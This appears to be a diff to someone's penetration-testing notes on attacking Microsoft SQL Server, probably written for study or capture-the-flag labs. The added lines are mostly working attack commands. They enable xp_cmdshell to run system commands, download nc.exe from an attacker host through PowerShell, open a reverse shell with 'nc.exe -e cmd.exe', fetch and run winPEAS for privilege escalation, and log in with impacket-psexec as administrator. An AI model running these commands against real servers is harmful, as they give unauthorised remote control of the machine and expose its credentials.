@@ -6,6 +6,11 @@ Can be prevent by doing input validation, parameterized queries, stored procedur
 
 # MS-SQL
 
+- Resources
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
+
 - Locate
 msf > use auxiliary/scanner/mssql/mssql_ping
 nmap -Pn -n -T4 --open -p1434 -sU <target IP>
@@ -19,12 +24,33 @@ msf > use auxiliary/admin/mssql/mssql_escalate_dbowner
 
 - Connect with creds
 impacket-mssqlclient <host name>/<user>@<target IP> -windows-auth
+help
+select @@version;
+SELECT name FROM master..syslogins
+enable_xp_cmdshell
+xp_cmdshell whoami /all
+xp_cmdshell net user
 
-Post exploitation
-msf > use auxiliary/admin/mssql/mssql_exec
+- Get a shell
+cd /usr/share/windows-binaries/
+sudo python3 -m http.server 80
+Open a new tab.
+sudo nc -lvnp 443
 
-- xp_cmdshell
-https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://attacker IP/nc.exe -outfile nc.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <attacker IP> 443"
+
+- Privesc
+cd /home/kali/Desktop/
+wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+sudo python3 -m http.server 80
+
+powershell wget http://attacker IP/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64
+Searching know files that can contain creds in home
+
+Open a new tab.
+impacket-psexec administrator@<target IP>
 
 - Authenticate to a db
 Use Microsoft SQL Server Management Studio (SSMS)
